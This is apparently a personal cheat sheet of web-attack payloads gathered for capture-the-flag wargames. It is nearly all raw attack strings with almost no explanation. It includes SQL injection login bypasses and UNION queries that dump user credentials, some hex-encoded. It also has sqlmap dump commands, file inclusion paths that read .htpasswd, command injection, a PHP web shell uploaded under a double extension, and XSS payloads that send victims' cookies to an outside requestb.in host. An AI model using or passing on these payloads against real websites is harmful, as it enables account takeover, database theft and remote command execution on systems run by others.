$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\" 
-> use : \""or 1-- or 1 "--

--hex sqli
login=' union select ' union select 1,group_concat(table_name) from information_schema.tables where table_schema like database()-- --- -
login=' union select ' union select 1,group_concat(column_name) from information_schema.columns where table_name like users-- --- -
login=' union select ' union select 1, group_concat(login, 0x3C, password) from users-- --- -
--hexed
/*
login=' union select 0x2720756e696f6e2073656c65637420312c67726f75705f636f6e636174287461626c655f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d61206c696b6520646174616261736528292d2d202d-- -

login=' union select 0x2720756e696f6e2073656c65637420312c67726f75705f636f6e63617428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f6e616d65206c696b65203078373537333635373237332d2d202d-- -

login=' union select 0x2720756e696f6e2073656c65637420312c2067726f75705f636f6e636174286c6f67696e2c20307833432c2070617373776f7264292066726f6d2075736572732d2d202d-- -
*/
-- sqlite master 

tables : 'dadada ' union select group_concat(tbl_name) from sqlite_master--
sqlite_master

$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\""; 
SELECT * from users where username=\"".$_REQUEST["username"]."\" and password - 
SELECT * from users where username=\""\or 1"--"--""\""
->use : \or 1"--"--

--basic no filter charater
SELECT * FROM <table1> WHERE <column> = 1 
-> use : or 1 = 1 get fault
-> use : order by 1,2..n to get number of column
-> finish !



login
SELECT 1 FROM user where `username`=''
->use : ' or 1 -- - '

-- ' or 1=1--
-- " or 1=1-- or 1=1--                    
-- ' or 'a'='a
-- " or "a"="a ') or ('a'='a
-- ' or 1=1--
-- ') or 2>1) --
--http://chall04-web01.wargame.whitehat.vn/detail.php?pet=-pet01%27/**/union/**/all/**/select/**/1,Flag,3,4/**/from/**/flag/**/--+

SELECT view=\"".$_REQUEST["view"]."\" from level20 where Qality <>....
pages/../admin/.htpasswd

WHERE (id IS NOT NULL) AND (ID = ? AND display = 1) 
 ? = 0) OR (ID IS NULL) OR (1=2

-- SQLite 
--get table name
SELECT name FROM sqlite_master WHERE type='table'
query :
?q=3\&s=+uniunionon+select+1,2--+
--sqlmap
--get all database
-> python sqlmap.py -u <url> --dbs   
--get all table from database 
-> python sqlmap.py -u <url>=id -D <data_base_name> --tables
--get all column from database , table 
-> python sqlmap.py -u <url>=id -D <data_base_name> -T <table> --columns
--dump all data from columns
-> python sqlmap.py -u <url>=id -D <data_base_name> -T <table> -C <column> --dump
--LFI
index.php?page=

index.php?page=../admin/.htpasswd


-- XSS steal cookie
markdown("<javascript:document.location='site_here?cookie='+document.cookie;>")
-- > go to https://requestb.in/link_here?inspect and get the cookie
<script>window.location="https://requestb.in/pnxwd8pn/cookie.php?c="+document.cookie;</script>

--MD5 only letter
cbaabcdljdac : cadbfdfecdcdcdacdbbbfadbcccefabd

--
index.php.bak
index.php.bk
HuTech
HuT3ch
--What is your hacker name ?
--CRLF _ inject log file
username=Kevin authenticated.%0D%0AKevin&password=d
--
127.0.0.1+%26+ls+-la+%26+cat+index.php

--double extention
[+] Solution: upload file with filename is upload.php.png and contain <?php echo shell_exec($_GET['cmd']);?>
[+] Payload: ?cmd = cat ../../../.passwd

--HTTP Header 
/GET/POST/PUT/DELETE/OPTIONS/(OPTION)

